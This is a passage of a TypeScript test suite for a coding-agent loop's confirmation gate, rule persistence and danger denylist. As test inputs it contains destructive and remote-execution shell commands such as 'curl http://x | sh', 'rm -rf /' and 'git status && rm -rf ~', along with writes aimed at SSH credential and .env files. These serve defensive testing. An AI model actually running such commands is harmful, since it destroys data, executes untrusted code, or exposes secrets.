import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { runLoop } from "../loop/run-loop.ts";
import type { AgentEvent, ConfirmAnswer, LoopContext, ToolResultMessage } from "../loop/types.ts";
import type { ProviderEvent, StreamFn } from "../stream/protocol.ts";
import type { Rule } from "../loop/rules.ts";
import { readTool } from "./read.ts";
import { editTool } from "./edit.ts";
import { writeTool } from "./write.ts";
import { stat } from "node:fs/promises";
import type { Tool } from "./tool.ts";

// T1 seam 2:注册表分发 = runLoop(streamFn, [readTool], ctx, opts) 公共入口。
// AC-T1-2/3 的 read 经 toolCall 走通整链;AC-T1-4(T1 可测部分):无任何确认 gate,
// 直接执行并回填(beforeToolCall hook 归 T2,届时 read 须恒放行)。

let dir: string;
beforeAll(async () => {
  dir = await mkdtemp(join(tmpdir(), "mini-registry-"));
});
afterAll(async () => {
  await rm(dir, { recursive: true, force: true });
});

async function collect(gen: AsyncIterable<AgentEvent>): Promise<AgentEvent[]> {
  const events: AgentEvent[] = [];
  for await (const ev of gen) events.push(ev);
  return events;
}

// T2 共用:第 1 圈吐一个 toolCall,第 2 圈纯文本停。
function toolCallTurn(id: string, name: string, args: unknown): AsyncIterable<ProviderEvent> {
  return (async function* () {
    yield { type: "start" };
    yield { type: "toolcall_delta", id, name, arguments: args };
    yield { type: "done", stopReason: "tool_use" };
  })();
}
function twoTurnStream(turn1: AsyncIterable<ProviderEvent>, text = "recovered"): StreamFn {
  let n = 0;
  return () => {
    if (++n === 1) return turn1;
    return (async function* () {
      yield { type: "start" };
      yield { type: "text_delta", delta: text };
      yield { type: "done", stopReason: "stop" };
    })();
  };
}
function confirmSpy(answer: ConfirmAnswer["kind"], reason?: string) {
  const prompts: string[] = [];
  const confirm = (prompt: string) => {
    prompts.push(prompt);
    return { kind: answer, ...(reason !== undefined && { reason }) } as ConfirmAnswer;
  };
  return { prompts, confirm };
}

// C6 AC-2/AC-4:抽弹面规则行 —— 行内式(`…规则: bash  git commit:*`)与列表式(`    bash  git diff:*`)
// 同一条正则:`<tool>` + 两个空格 + 非空 prefix。首行 `Execute: bash({…` 无双空格,不误匹配。
function printedRules(prompt: string): string[] {
  return prompt
    .split("\n")
    .map((l) => /\b(bash|write|edit)\s{2}(\S.*\S)$/.exec(l.trimEnd()))
    .filter((m): m is RegExpExecArray => m !== null)
    .map((m) => `${m[1]}  ${m[2]}`);
}

describe("T1 注册表分发:toolCall→read→toolResult 整链", () => {
  it("假流吐 toolCall read{offset:10,limit:5} → 回填恰第 10–14 行、id/name 配对、直接执行", async () => {
    const path = join(dir, "f100.txt");
    await writeFile(path, Array.from({ length: 100 }, (_, i) => `L${i + 1}`).join("\n"));

    // 第 1 圈吐 toolCall(交 loop 分发),第 2 圈纯文本(停)。
    const turn1: AsyncIterable<ProviderEvent> = (async function* () {
      yield { type: "start" };
      yield {
        type: "toolcall_delta",
        id: "c1",
        name: "read",
        arguments: { path, offset: 10, limit: 5 },
      };
      yield { type: "done", stopReason: "tool_use" };
    })();
    const turn2: AsyncIterable<ProviderEvent> = (async function* () {
      yield { type: "start" };
      yield { type: "text_delta", delta: "done" };
      yield { type: "done", stopReason: "stop" };
    })();
    let turn = 0;
    const streamFn: StreamFn = () => (++turn === 1 ? turn1 : turn2);

    const context: LoopContext = { messages: [{ role: "user", content: "read f100" }] };
    const events = await collect(runLoop(streamFn, [readTool], context, {}));

    // 分发事件对:start→end,end 载成功 result(= read 直接执行,无确认挂起)
    const start = events.find((e) => e.type === "tool_execution_start");
    const end = events.find((e) => e.type === "tool_execution_end");
    expect(start?.type).toBe("tool_execution_start");
    expect(end?.type).toBe("tool_execution_end");
    if (start?.type !== "tool_execution_start" || end?.type !== "tool_execution_end") return;
    expect([start.toolCallId, start.toolName]).toEqual(["c1", "read"]);
    expect([end.toolCallId, end.isError]).toEqual(["c1", false]);

    // 回填 messages:role=toolResult,toolCallId/toolName 配对,content 恰 10–14 行带行号
    const toolMsg = context.messages.find((m): m is ToolResultMessage => m.role === "toolResult");
    expect(toolMsg).toBeDefined();
    expect([toolMsg?.toolCallId, toolMsg?.toolName, toolMsg?.isError]).toEqual([
      "c1",
      "read",
      false,
    ]);
    expect(toolMsg?.content.map((b) => b.text).join("")).toBe(
      ["10\tL10", "11\tL11", "12\tL12", "13\tL13", "14\tL14"].join("\n"),
    );
  });
});

describe("T2 AC-T2-4: args schema 校验失败 → error result 回喂、不中断", () => {
  it("edit 缺 edits 字段 → invalid arguments error 回填、第 2 turn 照常起、run 未执行", async () => {
    const target = join(dir, "never-created.txt"); // 校验失败应挡在 run 前,连 read 都不到

    const turn1: AsyncIterable<ProviderEvent> = (async function* () {
      yield { type: "start" };
      yield { type: "toolcall_delta", id: "c1", name: "edit", arguments: { path: target } };
      yield { type: "done", stopReason: "tool_use" };
    })();
    const turn2: AsyncIterable<ProviderEvent> = (async function* () {
      yield { type: "start" };
      yield { type: "text_delta", delta: "recovered" };
      yield { type: "done", stopReason: "stop" };
    })();
    let turn = 0;
    const streamFn: StreamFn = () => (++turn === 1 ? turn1 : turn2);

    const context: LoopContext = { messages: [{ role: "user", content: "edit it" }] };
    const events = await collect(runLoop(streamFn, [editTool], context, {}));

    const toolMsg = context.messages.find((m): m is ToolResultMessage => m.role === "toolResult");
    expect(toolMsg).toBeDefined();
    expect([toolMsg?.toolCallId, toolMsg?.isError]).toEqual(["c1", true]);
    expect(toolMsg?.content.map((b) => b.text).join("")).toMatch(/invalid arguments/i);

    // 不中断:第 2 turn 照常起,agent_end 收尾
    expect(events.filter((e) => e.type === "turn_start")).toHaveLength(2);
    expect(events.some((e) => e.type === "agent_end")).toBe(true);
    // run 未执行:目标文件从未被创建
    await expect(stat(target)).rejects.toMatchObject({ code: "ENOENT" });
  });
});

describe("T2 AC-T2-5: beforeToolCall confirm yes/no + read 豁免", () => {
  it("yes → 过检后照常执行落盘", async () => {
    const path = join(dir, "c5yes.txt");
    await writeFile(path, "aaa\n");
    const { prompts, confirm } = confirmSpy("yes");

    const context: LoopContext = { messages: [{ role: "user", content: "go" }] };
    await collect(
      runLoop(
        twoTurnStream(
          toolCallTurn("c1", "edit", { path, edits: [{ oldText: "aaa", newText: "AAA" }] }),
        ),
        [editTool],
        context,
        { confirm },
      ),
    );

    expect(prompts).toHaveLength(1);
    expect(prompts[0]).toMatch(/Execute/);
    expect(await readFile(path, "utf8")).toBe("AAA\n");
  });

  it("no → run 不执行、result 标 user rejected、事件对仍配对", async () => {
    const path = join(dir, "c5no.txt");
    await writeFile(path, "aaa\n");
    const { prompts, confirm } = confirmSpy("no");

    const context: LoopContext = { messages: [{ role: "user", content: "go" }] };
    const events = await collect(
      runLoop(
        twoTurnStream(
          toolCallTurn("c1", "edit", { path, edits: [{ oldText: "aaa", newText: "AAA" }] }),
        ),
        [editTool],
        context,
        { confirm },
      ),
    );

    expect(prompts).toHaveLength(1);
    expect(await readFile(path, "utf8")).toBe("aaa\n"); // 未执行
    const end = events.filter((e) => e.type === "tool_execution_end")[0];
    expect(end?.type === "tool_execution_end" && end.isError).toBe(true); // start/end 配对不破
    const toolMsg = context.messages.find((m): m is ToolResultMessage => m.role === "toolResult");
    expect(toolMsg?.content.map((b) => b.text).join("")).toMatch(/user rejected/i);
  });

  it("read 恒放行:confirm 零调用", async () => {
    const path = join(dir, "c5read.txt");
    await writeFile(path, "hello\n");
    const { prompts, confirm } = confirmSpy("no"); // 就算 no 也不该轮到 read

    const context: LoopContext = { messages: [{ role: "user", content: "read it" }] };
    await collect(
      runLoop(twoTurnStream(toolCallTurn("c1", "read", { path })), [readTool], context, {
        confirm,
      }),
    );

    expect(prompts).toHaveLength(0);
    const toolMsg = context.messages.find((m): m is ToolResultMessage => m.role === "toolResult");
    expect(toolMsg?.isError).toBe(false);
  });
});

describe("T3 AC-T3-4: write 过确认(no → 不写文件、result skipped)", () => {
  it("confirm 假应答 no → run 未执行、文件不存在、result 标 user rejected(= skipped 词汇)", async () => {
    const path = join(dir, "t34-never.txt");
    const { prompts, confirm } = confirmSpy("no");

    const context: LoopContext = { messages: [{ role: "user", content: "write it" }] };
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("c1", "write", { path, content: "SECRET" })),
        [writeTool],
        context,
        { confirm },
      ),
    );

    expect(prompts).toHaveLength(1); // write 未声明 skipConfirm → 必过安检
    await expect(stat(path)).rejects.toMatchObject({ code: "ENOENT" }); // 文件不存在
    const toolMsg = context.messages.find((m): m is ToolResultMessage => m.role === "toolResult");
    expect(toolMsg?.isError).toBe(true);
    expect(toolMsg?.content.map((b) => b.text).join("")).toMatch(/user rejected/i);
  });
});

describe("T2 AC-T2-6: 新工具自动过安检(逻辑在 loop hook 不在工具)", () => {
  it("rmrf 只声明 name+run → confirm 仍被调;no → run 零调用", async () => {
    // rmrf 工具源 = 下面这个字面量:零确认代码、零 skipConfirm 声明 → 安检必来自 loop。
    let runCalls = 0;
    const rmrf: Tool = {
      name: "rmrf",
      async run() {
        runCalls += 1;
        return { content: [{ type: "text", text: "boom" }], isError: false };
      },
    };
    const { prompts, confirm } = confirmSpy("no");

    const context: LoopContext = { messages: [{ role: "user", content: "go" }] };
    await collect(
      runLoop(twoTurnStream(toolCallTurn("c1", "rmrf", { target: "/" })), [rmrf], context, {
        confirm,
      }),
    );

    expect(prompts).toHaveLength(1); // 新工具自动过安检
    expect(runCalls).toBe(0); // no → 未执行
    const toolMsg = context.messages.find((m): m is ToolResultMessage => m.role === "toolResult");
    expect([toolMsg?.isError, runCalls]).toEqual([true, 0]);
  });
});

// 假 bash(T4 前占位,走同一条 loop 缝)。prefixOf = 工具声明的"规则种子"抽取器(D3):
// `git push` → `git:*`。免弹判定(相等)与落盘都在 loop,rules 逻辑不外泄。
function fakeBash(calls: { n: number }): Tool {
  return {
    name: "bash",
    prefixOf: (a) => `${String((a as { command?: unknown }).command ?? "").split(/\s+/)[0]}:*`,
    matchOf: (a) => String((a as { command?: unknown }).command ?? ""),
    async run() {
      calls.n += 1;
      return { content: [{ type: "text", text: "ok" }], isError: false };
    },
  };
}

describe("T2 AC-T2-7: always → 落 rules.json,同前缀下次免弹", () => {
  it("第 1 次 always → 执行 + rules.json 含 {bash,git:*};第 2 次同前缀 → confirm 零调用仍执行", async () => {
    const rulesPath = join(dir, "rules-t27.json");
    const calls = { n: 0 };

    // —— 第 1 趟:应答 always
    const s1 = confirmSpy("always");
    const ctx1: LoopContext = { messages: [{ role: "user", content: "push it" }] };
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("c1", "bash", { command: "git push" })),
        [fakeBash(calls)],
        ctx1,
        { confirm: s1.confirm, rulesPath },
      ),
    );
    expect(s1.prompts).toHaveLength(1);
    expect(calls.n).toBe(1);
    expect(JSON.parse(await readFile(rulesPath, "utf8"))).toEqual(
      expect.arrayContaining([{ tool: "bash", prefix: "git:*" }]),
    );

    // —— 第 2 趟:应答故意设 no —— 若还弹 confirm,run 被拦,calls 不加 → 红。
    const s2 = confirmSpy("no");
    const ctx2: LoopContext = { messages: [{ role: "user", content: "push again" }] };
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("c2", "bash", { command: "git push origin main" })),
        [fakeBash(calls)],
        ctx2,
        { confirm: s2.confirm, rulesPath },
      ),
    );
    expect(s2.prompts).toHaveLength(0); // rules 命中,免弹
    expect(calls.n).toBe(2); // 照常执行
  });
});

describe("T2 AC-T2-8: 手删 rules.json 即撤销 + 无一键全允许", () => {
  it("always 落盘后手删文件 → 下次同前缀重新弹 confirm", async () => {
    const rulesPath = join(dir, "rules-t28a.json");
    const calls = { n: 0 };

    const s1 = confirmSpy("always");
    const ctx1: LoopContext = { messages: [{ role: "user", content: "push" }] };
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("c1", "bash", { command: "git push" })),
        [fakeBash(calls)],
        ctx1,
        { confirm: s1.confirm, rulesPath },
      ),
    );
    expect(s1.prompts).toHaveLength(1);
    await readFile(rulesPath); // 已落盘(存在性由 T2-7 证,这里只为删前确认)

    await rm(rulesPath); // 手删 = 撤销

    const s2 = confirmSpy("yes");
    const ctx2: LoopContext = { messages: [{ role: "user", content: "push 2" }] };
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("c2", "bash", { command: "git push" })),
        [fakeBash(calls)],
        ctx2,
        { confirm: s2.confirm, rulesPath },
      ),
    );
    expect(s2.prompts).toHaveLength(1); // 撤销生效:重新弹
    expect(calls.n).toBe(2); // yes 后照常执行
  });

  it("prefixOf 返 `*` 的工具应答 always → 规则拒写,下次仍弹(loop 无一键全允许)", async () => {
    const rulesPath = join(dir, "rules-t28b.json");
    const calls = { n: 0 };
    const star: Tool = {
      name: "bash",
      prefixOf: () => "*",
      async run() {
        calls.n += 1;
        return { content: [{ type: "text", text: "ok" }], isError: false };
      },
    };

    const s1 = confirmSpy("always");
    const ctx1: LoopContext = { messages: [{ role: "user", content: "yolo" }] };
    await collect(
      runLoop(twoTurnStream(toolCallTurn("c1", "bash", { command: "rm -rf /" })), [star], ctx1, {
        confirm: s1.confirm,
        rulesPath,
      }),
    );
    expect(s1.prompts).toHaveLength(1); // 弹过
    expect(calls.n).toBe(1); // always 当次仍执行(一次性 yes 语义)
    await expect(stat(rulesPath)).rejects.toMatchObject({ code: "ENOENT" }); // 但规则没落盘

    const s2 = confirmSpy("yes");
    const ctx2: LoopContext = { messages: [{ role: "user", content: "yolo 2" }] };
    await collect(
      runLoop(twoTurnStream(toolCallTurn("c2", "bash", { command: "rm -rf /" })), [star], ctx2, {
        confirm: s2.confirm,
        rulesPath,
      }),
    );
    expect(s2.prompts).toHaveLength(1); // 永远要问 = 没有全允许
  });
});

// C2(docs/ISSUES.md):规则匹配从"整串相等"升级为 ruleMatches(token 前缀家族)。
// 判据输入 = 完整命令(matchOf),不再拿 prefixOf 种子串比种子串。
describe("C2 端到端:token 家族规则过确认门", () => {
  it("规则 `git status:*` → `git status -sb` 免弹执行;`git commit -m x` 仍弹", async () => {
    const rulesPath = join(dir, "rules-c2.json");
    await writeFile(rulesPath, JSON.stringify([{ tool: "bash", prefix: "git status:*" }]));
    const calls = { n: 0 };

    const s1 = confirmSpy("no"); // 免弹故应答无意义;若弹 → 拦下 → prompts 1 = 红
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("c1", "bash", { command: "git status -sb" })),
        [fakeBash(calls)],
        { messages: [{ role: "user", content: "s" }] },
        { confirm: s1.confirm, rulesPath },
      ),
    );
    expect(s1.prompts).toHaveLength(0);
    expect(calls.n).toBe(1);

    const s2 = confirmSpy("no");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("c2", "bash", { command: "git commit -m x" })),
        [fakeBash(calls)],
        { messages: [{ role: "user", content: "c" }] },
        { confirm: s2.confirm, rulesPath },
      ),
    );
    expect(s2.prompts).toHaveLength(1);
    expect(calls.n).toBe(1); // no → 未执行
  });
});

// C1(docs/ISSUES.md):文件类种子 = 规范化 path(`path:` 域),内容变化不再击落规则;
// cwd 外路径 → prefixOf 返 `*` 拒写标记(AC-T2-8 既有机器退化一次性 yes,loop 零新码)。
describe("C1 端到端:write 的 always 必粘 + cwd 外拒粘", () => {
  let cwdTmp: string;
  beforeAll(async () => {
    cwdTmp = await mkdtemp(join(process.cwd(), ".mini-c1-")); // 故意落在 cwd 内
  });
  afterAll(async () => {
    await rm(cwdTmp, { recursive: true, force: true });
  });

  it("同文件两次 write(内容不同)均应答 always → confirm 仅 1 次、两次都落盘", async () => {
    const rulesPath = join(dir, "rules-c1a.json");
    const path = join(cwdTmp, "a.txt"); // cwd 内 → 相对 path: 种子
    const s = confirmSpy("always");
    for (const content of ["V1", "V2"]) {
      await collect(
        runLoop(
          twoTurnStream(toolCallTurn(`w-${content}`, "write", { path, content })),
          [writeTool],
          { messages: [{ role: "user", content }] },
          { confirm: s.confirm, rulesPath },
        ),
      );
    }
    expect(s.prompts).toHaveLength(1); // 现状 bug 在此红:种子=整 JSON,内容变即脱靶
    expect(await readFile(path, "utf8")).toBe("V2");
    const rules: unknown = JSON.parse(await readFile(rulesPath, "utf8"));
    expect(rules).toEqual(
      expect.arrayContaining([
        { tool: "write", prefix: expect.stringMatching(/^path:\.mini-c1-[^/]+\/a\.txt$/) },
      ]),
    );
  });

  it("同文件连续 edit 两次(锚点不同)均 always → confirm 仅首弹,两批锚皆落盘", async () => {
    const rulesPath = join(dir, "rules-c1c.json");
    const path = join(cwdTmp, "e.txt");
    await writeFile(path, "aaa\nbbb");
    const s = confirmSpy("always");
    for (const [id, oldText, newText] of [
      ["e1", "aaa", "AAA"],
      ["e2", "bbb", "BBB"],
    ] as const) {
      await collect(
        runLoop(
          twoTurnStream(toolCallTurn(id, "edit", { path, edits: [{ oldText, newText }] })),
          [editTool],
          { messages: [{ role: "user", content: id }] },
          { confirm: s.confirm, rulesPath },
        ),
      );
    }
    expect(s.prompts).toHaveLength(1);
    expect(await readFile(path, "utf8")).toBe("AAA\nBBB");
  });

  it("cwd 外绝对路径 always → 规则拒写,第二次仍弹(prompts 2)", async () => {
    const rulesPath = join(dir, "rules-c1b.json");
    const path = join(dir, "out.txt"); // /tmp = cwd 外
    const s = confirmSpy("always");
    for (const content of ["A", "B"]) {
      await collect(
        runLoop(
          twoTurnStream(toolCallTurn(`o-${content}`, "write", { path, content })),
          [writeTool],
          { messages: [{ role: "user", content }] },
          { confirm: s.confirm, rulesPath },
        ),
      );
    }
    expect(s.prompts).toHaveLength(2);
    expect(await readFile(rulesPath, "utf8").catch(() => "[]")).toBe("[]");
  });
});

// C5(docs/ISSUES.md):判据输入与种子拆分。cwd 外路径 matchOf 改给 `path:`+绝对
// —— 黑名单(`~/.ssh/**` `~/.aws/**` `**/*.env`)要有料可查;prefixOf 照旧 `*`
// = C1 always 拒写语义不动(现有 "cwd 外…第二次仍弹" 回归即守门)。
describe("C5 判据抽取:matchOf/prefixOf 拆分", () => {
  it("cwd 外 write → matchOf = `path:`+绝对,prefixOf = `*`", () => {
    const out = join(dir, "z.txt");
    expect(writeTool.matchOf!({ path: out })).toBe(`path:${out}`);
    expect(writeTool.prefixOf!({ path: out })).toBe("*");
  });

  it("cwd 内 write → 两者同值 `path:`+相对正斜杠;edit 同式", () => {
    const p = join(process.cwd(), "sub", "a.ts");
    expect(writeTool.matchOf!({ path: p })).toBe("path:sub/a.ts");
    expect(writeTool.prefixOf!({ path: p })).toBe("path:sub/a.ts");
    expect(editTool.matchOf!({ path: p, edits: [] })).toBe("path:sub/a.ts");
  });

  it("write/edit 声明 matchKind = path(黑名单文件路径判定的开关)", () => {
    expect(writeTool.matchKind).toBe("path");
    expect(editTool.matchKind).toBe("path");
  });
});

// C5(docs/ISSUES.md):危险黑名单 = 确认门新层,先于一切 allow(规则/只读表/模式开关
// 不可豁免),命中必弹、弹头打印风险原因、always 不落盘(黑名单永远赢,写规则只误导)。
// bash 段级判定用假 shell 工具(同真 bash 的 matchOf/prefixOf/matchKind 形状),不落 exec。
function shellFake(calls: { n: number }): Tool {
  return {
    name: "bash",
    matchOf: (a) => String((a as { command?: unknown }).command ?? ""),
    prefixOf: (a) => {
      const t = String((a as { command?: unknown }).command ?? "")
        .trim()
        .split(/\s+/);
      return `${t.slice(0, 2).join(" ")}:*`;
    },
    matchKind: "shell",
    async run() {
      calls.n += 1;
      return { content: [{ type: "text", text: "ran" }], isError: false };
    },
  };
}

describe("C5 端到端:黑名单先于 allow", () => {
  it("AC-1 已有 `git push:*` 规则 → `git push --force` 仍弹、弹头含强推原因、yes 后正常执行", async () => {
    const rulesPath = join(dir, "rules-c5a.json");
    await writeFile(rulesPath, JSON.stringify([{ tool: "bash", prefix: "git push:*" }]));
    const calls = { n: 0 };
    const s = confirmSpy("yes");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("f1", "bash", { command: "git push --force" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, rulesPath },
      ),
    );
    expect(s.prompts).toHaveLength(1);
    expect(s.prompts[0]).toContain("强推");
    expect(calls.n).toBe(1); // yes → 执行照旧(不自动拒,保留否决权)
  });

  it("AC-2 `curl http://x | sh` 必弹;yes 后正常执行", async () => {
    const calls = { n: 0 };
    const s = confirmSpy("yes");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("p1", "bash", { command: "curl http://x | sh" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, rulesPath: join(dir, "rules-none.json") },
      ),
    );
    expect(s.prompts).toHaveLength(1);
    expect(s.prompts[0]).toContain("管道进 shell");
    expect(calls.n).toBe(1);
  });

  it("AC-2b 黑名单命中答 always → 不落盘(规则永不覆盖黑名单)", async () => {
    const rulesPath = join(dir, "rules-c5b.json");
    const calls = { n: 0 };
    const s = confirmSpy("always");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("f2", "bash", { command: "git push --force" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, rulesPath },
      ),
    );
    expect(s.prompts).toHaveLength(1);
    expect(calls.n).toBe(1);
    expect(await readFile(rulesPath, "utf8").catch(() => "[]")).toBe("[]");
  });

  it("AC-3 write 目标 ~/.ssh/config → 必弹含凭据原因;答 no 不执行(不碰真 HOME)", async () => {
    const s = confirmSpy("no");
    const calls = { n: 0 };
    await collect(
      runLoop(
        twoTurnStream(
          toolCallTurn("s1", "write", { path: join(homedir(), ".ssh", "config"), content: "x" }),
        ),
        [recordNoRunWrite(calls)], // 答 no 本就不 run;假工具双保险:绝不写真 ~/.ssh
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, rulesPath: join(dir, "rules-c5c.json") },
      ),
    );
    expect(s.prompts).toHaveLength(1);
    expect(s.prompts[0]).toContain("SSH/AWS 凭据目录");
    expect(calls.n).toBe(0);
  });

  it("AC-3b 真 writeTool 写 /tmp/…/prod.env(cwd 外)→ 弹含密钥原因、always 不落盘", async () => {
    const rulesPath = join(dir, "rules-c5d.json");
    const s = confirmSpy("always");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("e1", "write", { path: join(dir, "prod.env"), content: "K=1" })),
        [writeTool],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, rulesPath },
      ),
    );
    expect(s.prompts).toHaveLength(1);
    expect(s.prompts[0]).toContain("*.env 密钥文件");
    expect(await readFile(rulesPath, "utf8").catch(() => "[]")).toBe("[]");
    // seed = `*`(cwd 外)→ always 既有拒粘机器兜住,不写规则也不该写文件成功与否无关。
  });

  it("AC-4 规则写歪(`sudo:*` 预批)仍压不过黑名单 → `sudo ls -la` 必弹", async () => {
    const rulesPath = join(dir, "rules-c5e.json");
    await writeFile(rulesPath, JSON.stringify([{ tool: "bash", prefix: "sudo:*" }]));
    const calls = { n: 0 };
    const s = confirmSpy("yes");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("u1", "bash", { command: "sudo ls -la" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, rulesPath },
      ),
    );
    expect(s.prompts).toHaveLength(1);
    expect(s.prompts[0]).toContain("sudo 提权");
  });

  it("复合段堵洞:有 `git status:*` 规则,`git status && rm -rf ~` 必弹(rm 段)", async () => {
    const rulesPath = join(dir, "rules-c5f.json");
    await writeFile(rulesPath, JSON.stringify([{ tool: "bash", prefix: "git status:*" }]));
    const calls = { n: 0 };
    const s = confirmSpy("no");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("m1", "bash", { command: "git status && rm -rf ~" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, rulesPath },
      ),
    );
    expect(s.prompts).toHaveLength(1);
    expect(s.prompts[0]).toContain("rm -rf 指向根/家目录");
    expect(calls.n).toBe(0);
  });
});

// C5 AC-3 用的记录型假 write:同真 write 的判据/种子/matchKind,run 只计数(不碰真 HOME)。
function recordNoRunWrite(calls: { n: number }): Tool {
  return {
    name: "write",
    matchOf: (a) => `path:${String((a as { path?: unknown }).path ?? "")}`,
    prefixOf: () => "*",
    matchKind: "path",
    async run() {
      calls.n += 1;
      return { content: [{ type: "text", text: "noop" }], isError: false };
    },
  };
}

// C7(docs/ISSUES.md):--auto-accept-edits —— 仅 path 工具 + cwd 内直通;bash/cwd 外/黑名单不豁免。
describe("C7 端到端:auto-accept-edits", () => {
  let cwdTmp: string;
  beforeAll(async () => {
    cwdTmp = await mkdtemp(join(process.cwd(), ".mini-c7-"));
  });
  afterAll(async () => {
    await rm(cwdTmp, { recursive: true, force: true });
  });

  it("flag 开:连续 2 次 cwd 内 write → confirm 零调用、两份都落盘", async () => {
    const s = confirmSpy("no");
    for (const [name, content] of [
      ["a.txt", "1"],
      ["b.txt", "2"],
    ] as const) {
      await collect(
        runLoop(
          twoTurnStream(toolCallTurn(`w-${name}`, "write", { path: join(cwdTmp, name), content })),
          [writeTool],
          { messages: [{ role: "user", content: name }] },
          { confirm: s.confirm, rulesPath: join(dir, "rules-c7a.json"), autoAcceptEdits: true },
        ),
      );
    }
    expect(s.prompts).toHaveLength(0);
    expect(await readFile(join(cwdTmp, "a.txt"), "utf8")).toBe("1");
    expect(await readFile(join(cwdTmp, "b.txt"), "utf8")).toBe("2");
    expect(await readFile(join(dir, "rules-c7a.json"), "utf8").catch(() => "[]")).toBe("[]");
  });

  it("flag 开:cwd 外 write 必弹", async () => {
    const s = confirmSpy("no");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("w-out", "write", { path: join(dir, "o.txt"), content: "1" })),
        [writeTool],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, autoAcceptEdits: true },
      ),
    );
    expect(s.prompts).toHaveLength(1);
  });

  it("flag 开:bash 不享直通", async () => {
    const s = confirmSpy("no");
    const calls = { n: 0 };
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("b1", "bash", { command: "echo hi" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, autoAcceptEdits: true },
      ),
    );
    expect(s.prompts).toHaveLength(1);
    expect(calls.n).toBe(0);
  });

  it("flag 开:cwd 内 *.env 仍被黑名单拦下弹", async () => {
    const s = confirmSpy("no");
    await collect(
      runLoop(
        twoTurnStream(
          toolCallTurn("w-env", "write", { path: join(cwdTmp, "secret.env"), content: "K=1" }),
        ),
        [writeTool],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, autoAcceptEdits: true },
      ),
    );
    expect(s.prompts).toHaveLength(1);
    expect(s.prompts[0]).toContain("*.env 密钥文件");
  });
});

// C6 四档弹窗(AC-1):session 档 = 内存规则,与持久规则同匹配器同短路点,仅生命周期不同。
// 判据:同 run(同一 sessionRules 数组)重跑免弹;rules.json 零新条目 = 不落盘。
describe("C6 AC-1:session 档 —— 同 run 免弹、不落盘", () => {
  it("第 1 次答 session → 执行 + 内存规则含 git push:* + rules.json 无条目;同 sessionRules 第 2 次免弹", async () => {
    const rulesPath = join(dir, "rules-c6a.json");
    const calls = { n: 0 };
    const sessionRules: Rule[] = [];

    const s1 = confirmSpy("session");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("q1", "bash", { command: "git push" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s1.confirm, rulesPath, sessionRules },
      ),
    );
    expect(s1.prompts).toHaveLength(1);
    expect(calls.n).toBe(1); // session 当次照常执行
    expect(sessionRules).toEqual([{ tool: "bash", prefix: "git push:*" }]);
    expect(await readFile(rulesPath, "utf8").catch(() => "[]")).toBe("[]");

    // 第 2 趟应答故意 no —— 若还弹则 run 被拦、calls 不加 = 红。
    const s2 = confirmSpy("no");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("q2", "bash", { command: "git push origin main" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s2.confirm, rulesPath, sessionRules },
      ),
    );
    expect(s2.prompts).toHaveLength(0);
    expect(calls.n).toBe(2);
  });

  // AC-1 另一半:session 生命周期止于本 run —— 换新 sessionRules(= 新进程)必复弹。
  it("session 落内存后新 run(新数组)恢复弹;同规则若曾 always 落盘则不弹(对照组)", async () => {
    const rulesPath = join(dir, "rules-c6b.json");
    const calls = { n: 0 };

    // 第 1 趟:session
    const s1 = confirmSpy("session");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("n1", "bash", { command: "git push" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s1.confirm, rulesPath, sessionRules: [] },
      ),
    );
    expect(s1.prompts).toHaveLength(1);

    // 第 2 趟:新数组(新 run),应答 no → 必弹且被拦
    const s2 = confirmSpy("no");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("n2", "bash", { command: "git push" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s2.confirm, rulesPath, sessionRules: [] },
      ),
    );
    expect(s2.prompts).toHaveLength(1); // session 未泄漏到下个 run
    expect(calls.n).toBe(1); // 弹后答 no → 未执行
    expect(await readFile(rulesPath, "utf8").catch(() => "[]")).toBe("[]"); // 全程零落盘
  });
});

// C6 AC-2:弹窗印出的规则文案 == rules.json 实际落盘内容,逐字一致(解析断言,非快照)。
// 用户点的就是他批的 —— 印面前 = 落盘面,由同一份建议规则数组渲染,禁止两套字符串。
describe("C6 AC-2:always 印面 == 落盘面", () => {
  it("单段命令 → 弹窗含规则行 `bash  git commit:*`,与落盘 JSON 逐字一致", async () => {
    const rulesPath = join(dir, "rules-c6c.json");
    const calls = { n: 0 };
    const s = confirmSpy("always");
    await collect(
      runLoop(
